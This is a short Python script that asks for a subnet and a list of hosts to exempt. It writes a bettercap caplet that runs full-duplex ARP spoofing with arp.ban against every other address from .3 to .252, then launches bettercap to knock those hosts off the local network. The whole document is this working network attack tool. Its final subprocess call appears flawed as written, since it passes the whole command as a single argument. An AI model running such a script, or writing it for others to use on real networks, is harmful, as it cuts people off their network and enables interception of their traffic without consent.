import subprocess

subnet = input("enter the subnet: ")

ipall = []

for i in range(3,253):
    ip = str(subnet) + "." + str(i)
    ipall.append(ip)


ipstr = ""

x= subnet + ".252"

for i in ipall:
    if(x==i):
        break
    else:
        ipstr = ipstr  + i + ","
        

ipstr = ipstr + x        
  

no_of_targets = int(input("enter number of targets to be excluded : "))

rm_tar = []


print("Enter the targets: ")
print("")
for i in range(0,no_of_targets):
    tar = input("target " + str(i+1) + " : ")
    rm_tar.append(tar)
    

# print(rm_tar)    
  
new_ipstr = ipstr    
exp = ""



for i in rm_tar:
    
    if(i==x):
        exp = "," + i
    
    else:
        exp =  i + ","
    
    new_ipstr = new_ipstr.replace(exp,"")
    
    
open("block.cap", "w").close() #to clear all contents of the file

with open("block.cap","w") as var:
    var.write("net.probe on\n")
    var.write("set arp.spoof.fullduplex true\n")
    var.write("set arp.spoof.targets " + new_ipstr + "\n")
    var.write("arp.spoof on\n")
    var.write("arp.ban on\n")
        


subprocess.run(["bettercap -iface eth0 -caplet block.cap"])


